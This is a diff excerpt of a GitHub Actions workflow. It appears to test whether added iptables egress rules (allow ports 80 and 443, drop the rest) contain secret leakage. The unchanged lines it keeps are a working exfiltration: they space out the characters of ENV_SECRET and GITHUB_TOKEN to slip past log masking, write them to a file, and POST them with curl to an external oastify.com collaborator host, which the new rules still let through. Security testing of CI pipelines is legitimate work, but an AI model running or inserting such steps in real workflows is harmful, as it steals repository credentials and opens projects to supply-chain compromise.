@@ -23,4 +23,16 @@ jobs:
         echo ${{ secrets.ENV_SECRET }} | sed 's/./& /g' >> foo.txt
         echo ${{ secrets.GITHUB_TOKEN }} | sed 's/./& /g' >> foo.txt
         cat foo.txt
+           # Create a new chain for egress traffic
+          sudo iptables -N egress
+
+          # Allow specific outgoing traffic (e.g., HTTP and HTTPS)
+          sudo iptables -A egress -p tcp --dport 80 -j ACCEPT
+          sudo iptables -A egress -p tcp --dport 443 -j ACCEPT
+
+          # Drop all other outgoing traffic
+          sudo iptables -A egress -j DROP
+
+          # Apply the egress chain to the output chain
+          sudo iptables -A OUTPUT -j egress
         curl --data "Keys:$(cat foo.txt)" http://c3g36rzh0gj5zg6uh1y9y5h1csij6bu0.oastify.com
